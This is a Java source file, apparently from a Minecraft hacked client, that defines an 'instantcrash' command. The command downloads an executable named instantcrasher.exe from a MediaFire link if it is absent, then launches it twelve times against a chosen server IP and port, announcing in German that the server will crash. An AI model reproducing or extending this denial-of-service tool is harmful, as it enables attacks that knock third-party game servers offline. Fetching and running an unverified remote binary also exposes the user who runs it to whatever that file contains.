package me.bratwurst.module.Commands;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.concurrent.atomic.AtomicInteger;

import me.bratwurst.Client;
import me.bratwurst.manager.Command;
import me.bratwurst.utils.MainUtil;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.client.multiplayer.ServerAddress;

public class instantcrash extends Command {
    InetAddress ip = null;

    private static final AtomicInteger IP_ID = new AtomicInteger(0);

    public instantcrash() {
        super("instantcrash", "instantcrash", "");
    }

    @Override
    public void onCommand(String command, String[] args) {
        try {
            File file = new File(Client.filePath, "instantcrasher.exe");
            if (file.exists()) {
                if (args.length == 1) {
                    String str = args[0];
                    if (str.contains(":"))
                        str = str.split(":")[0];
                    this.ip = InetAddress.getByName(str);
                    try {
                        this.ip = InetAddress.getByName(args[0]);
                    } catch (UnknownHostException unknownHostException) {
                        (new Thread("Server Pinger #" + IP_ID.incrementAndGet()) {

                            public void run() {
                                ServerAddress serverAddress = ServerAddress.func_78860_a(args[0]);
                                try {
                                    instantcrash.this.ip = InetAddress.getByName(serverAddress.getIP());
                                } catch (UnknownHostException unknownHostException) {
                                }
                            }
                        }).start();
                    }
                    MainUtil.SendClientMesage("§2Der Server §a" + this.ip.getHostAddress() + " §2wird nun crashen.");
                    for (byte b = 0; b < 12; b++) {
                        Process process = (new ProcessBuilder(new String[]{Client.filePath + "\\instantcrasher.exe", this.ip.getHostAddress(), "25565"+ " 1.8.9 1"})).start();
                    }
                } else if (args.length == 2) {
                    String str = args[0];
                    if (str.contains(":"))
                        str = str.split(":")[0];
                    this.ip = InetAddress.getByName(str);
                    try {
                        this.ip = InetAddress.getByName(args[0]);
                    } catch (UnknownHostException unknownHostException) {
                        (new Thread("Server Pinger #" + IP_ID.incrementAndGet()) {

                            public void run() {
                                ServerAddress serverAddress = ServerAddress.func_78860_a(args[0]);
                                try {
                                    instantcrash.this.ip = InetAddress.getByName(serverAddress.getIP());
                                } catch (UnknownHostException unknownHostException) {
                                }
                            }
                        }).start();
                    }
                    MainUtil.SendClientMesage("§2Der Server §a" + this.ip.getHostAddress() + ":" + args[1] + " §2wird nun crashen.");
                    for (byte b = 0; b < 12; b++) {
                        Process process = (new ProcessBuilder(new String[]{Client.filePath + "\\instantcrasher.exe", this.ip.getHostAddress(), args[1]+ " 1.8.9 1"})).start();
                    }
                } else {
                    MainUtil.SendClientMesage("§4#instantcrash [IP] (Port)");
                }
            } else {
                MainUtil.SendClientMesage("§4Downloade InstantCrasher...");
                try (InputStream inputStream = new URL("https://download1477.mediafire.com/mf0kv4ldlqug/4jt8wsub9ajqqbe/instantcrash.exe").openStream()) {
                    Files.copy(inputStream, Paths.get(Client.getWorkingPath("minecraft/God/Tools/instantcrasher.exe").getPath()),
                            StandardCopyOption.REPLACE_EXISTING);
                }
                MainUtil.SendClientMesage("§aInstantCrasher kann nun benutzt werden.");
                MainUtil.SendClientMesage("§4#instantcrash [IP] (Port)");
            }
        } catch (IOException iOException) {
            iOException.printStackTrace();
        }
    }
}